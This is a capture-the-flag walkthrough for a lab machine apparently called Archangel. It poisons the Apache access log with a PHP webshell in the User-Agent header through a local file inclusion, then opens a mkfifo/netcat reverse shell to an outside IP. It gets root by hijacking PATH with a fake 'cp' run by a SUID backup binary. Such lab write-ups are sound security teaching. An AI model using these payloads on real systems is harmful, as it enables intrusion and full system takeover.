## Accessing apache2 access.logs
Now that we have found an LFI, our next target is to gain an reverse shell. For this we can look into the apache log file stored at `/var/log/apache2/access.log`.
![[archangel11.png]]
From the access logs it can be seen that along with the path that we are trying to access our User-Agent is also getting logged. We can add a PHP code in the User-Agent header using Burp Suite and with the help of that gain a reverse shell.

### Steps to get a Reverse Shell via User-Agent
1. Capture a request to `/test.php?view=/var/www/html/development_testing/..//..//..//log/apache2/access.log` in Burp Suite and send it to repeater.
![[archangel12.png]]

2. Add the following code somewhere in the `User-Agent` header value:
```php
<?php system($_GET['cmd']); ?>
```

3. Append `&cmd=whoami` to the GET request. Here, all that we are doing is passing `whoami` string to the `cmd` variable would get processed by the PHP code in the User-Agent and we would get the output of the command in the logged User-Agent value in the `access.log` file.
![[archangel13.png]]
When you send the request for the first time, you won't see anything in the output because the command has just been executed and what you are viewing is the copy of log file before the output of your command was written to it.

 Therefore, you need to send the same request again so that the output written previous can now be viewed.

4. Now, that we have found a way to run commands on the system. We can send a reverse shell payload using the same method and start a listener on our local machine.

**Reverse shell payload:**
```python
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.47.177 4444 >/tmp/f
```

**Start the netcat listener** - 
```python
nc -lvnp 4444
```


After giving in a lot of time and re-analyzing everything. We can see the answer was right in front of us. In the `backup` binary. The command `cp` is being called but without its full path being mentioned. So, we can create a fake `cp` executable in and prepend its location to `$PATH`. So, whenever `cp` is called our malicious binary gets executed instead of the original `cp` command. This can be done as:

![[archangel14.png]]

1. Create a fake `cp` file in `/tmp` directory and add the following code to it.
```bash
archangel@ubuntu:/opt/backupfiles$ cd /tmp
cd /tmp
archangel@ubuntu:/tmp$ touch cp
touch cp
archangel@ubuntu:/tmp$ echo "/bin/bash -p" > cp
echo "/bin/bash -p" > cp
archangel@ubuntu:/tmp$ cat cp
cat cp
/bin/bash -p
```
So, whenever the `cp` command is called `/bin/bash` would get executed with the permission of the effective user (in case of SUID binary, it would be `root`).

2. Make the file accessible and executable by all
```bash
archangel@ubuntu:/tmp$ chmod 777 cp
```

3. Prepend `/tmp` to `$PATH`
```bash
archangel@ubuntu:~/secret$ $PATH            
$PATH
bash: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin: No such file or directory
archangel@ubuntu:~/secret$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
archangel@ubuntu:~/secret$ $PATH
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin: No such file or directory
```

4. Run the SUID binary
```bash
archangel@ubuntu:~/secret$ ./backup
./backup
root@ubuntu:~/secret# whoami
whoami
root
root@ubuntu:~/secret# cd /root
cd /root
root@ubuntu:/root# cat root.txt
```


## Archangel privilege escalation mind map
![[archangel_privesc.png]]
